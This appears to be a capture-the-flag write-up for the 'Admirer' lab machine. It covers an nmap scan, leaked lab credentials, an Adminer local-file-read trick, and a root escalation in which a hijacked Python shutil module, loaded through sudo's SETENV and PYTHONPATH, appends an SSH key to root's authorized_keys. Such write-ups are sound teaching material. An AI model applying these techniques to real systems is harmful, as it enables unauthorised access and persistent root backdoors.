# User

## nmap

```
Scanning 10.10.10.187 [65535 ports]
Discovered open port 80/tcp on 10.10.10.187
Discovered open port 22/tcp on 10.10.10.187
Discovered open port 21/tcp on 10.10.10.187
Connect Scan Timing: About 45.31% done; ETC: 22:31 (0:00:37 remaining)
Completed Connect Scan at 22:31, 66.25s elapsed (65535 total ports)
Initiating Service scan at 22:31
Scanning 3 services on 10.10.10.187
Completed Service scan at 22:31, 6.18s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.187.
Initiating NSE at 22:31
Completed NSE at 22:31, 2.77s elapsed
Initiating NSE at 22:31
Completed NSE at 22:31, 0.31s elapsed
Initiating NSE at 22:31
Completed NSE at 22:31, 0.00s elapsed
Nmap scan report for 10.10.10.187
Host is up (0.075s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Server

### robots.txt

```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

### admin-dir

Running enum you find `contacts.txt`:

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

and `credentials.txt`:

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

## FTP Server

```
Connected to admirer.htb.
220 (vsFTPd 3.0.3)
Name (admirer.htb:zoey): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02 21:24 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03 21:20 html.tar.gz
226 Directory send OK.
ftp> lcd /home/zoey/htb/admirer
Local directory now /home/zoey/htb/admirer
ftp> get dump.sql
local: dump.sql remote: dump.sql
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (4.9052 MB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 1.06 secs (4.7631 MB/s)
ftp>
```

## html.tar.gz

Contains a number of files with some interesting code, but nothing exploitable right off. `db_admin.php` has the following line: `// TODO: Finish implementing this or find a better open source alternative` and it's in the `utility-scripts` folder. Doing some enum we find `adminer.php`.

## adminer.php

The adminer version is vulnerable to LFI within the base directory of the web server. We need to open up a local mysql server to remote access, and then connect to it via adminer. Then create a table with a single field you can insert into. Run the following SQL command to include a file `load data local infile '../index.php' into table admirer.lfi`. In `index.php` we find

```php
$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";
```

## Owning User

The credentials in `index.php` work for ssh. Grab user.txt.

# Root

## waldo enum

Running `sudo -l` and entering the password reveals

```
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Looking at files within the group we find `/opt/scripts` which contains `admin_tasks.sh` and `backup.py`, and we see the former calls the latter. The code imports a library and we can modify the `PYTHONPATH` variable to call our own code. In `backup.py` we see

```python
from shutil import make_archive

make_archive(dst, 'gztar', src)
```

## Owning root

So let's create a payload and call it

```
waldo@admirer:~/test$ pwd
/home/waldo/test
waldo@admirer:~/test$ cat shutil.py
__all__ = ['make_archive']

import os

def make_archive(a,b,c):
        os.system("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvMuOQes+q48BhzkL2t3IotrxD2a3j4lEy8+6fMxS733eaj7wy6u0a4dy5ww9bMwlxujpaOFQcivf2GFp0hfCxb+8JqnkMjYBQsmGE7grx9MN+CqC2jwNeP+x+Zk4eaUwGSw4jgnKU2BADoJ84JNWLj3oz2nX83Px4ra/2QSuJJXm9aZ4a6XCPRe64qGswImL3Gp4eqSH1LY2EWXf1JA/0q8qE06aN/oeT0B8MsdLIETRuqThW/FstUTAlXkjhMfU/nR8GEkR1eP43hVpyIeaTnWArBJn9z2/PKPWFhnxtJ+c96LQiSXlVDO4DENuTFqWVKK2QAEZ1KqoHpgNaJ5Hdd2/GUH0whKeJHoG4Mrg+WVzM6JKGrYAu38yjZu7qRbKZwFCdE7Cu81X2d25qk2QqwNeh6xACv8CdrFr4S6fS2uyokLtYNiwkAUFQghO2hGKmoCUMzCkx+kwl2xJynfRQdJPUv+bZCYFmauMY7GF/UCYDDzWu4IZQS5YHUPHj25k=' >> /root/.ssh/authorized_keys")
waldo@admirer:~/test$ sudo PYTHONPATH=/home/waldo/test /opt/scripts/admin_tasks.sh 6
```

If everything went properly we should now be able to ssh in as root.
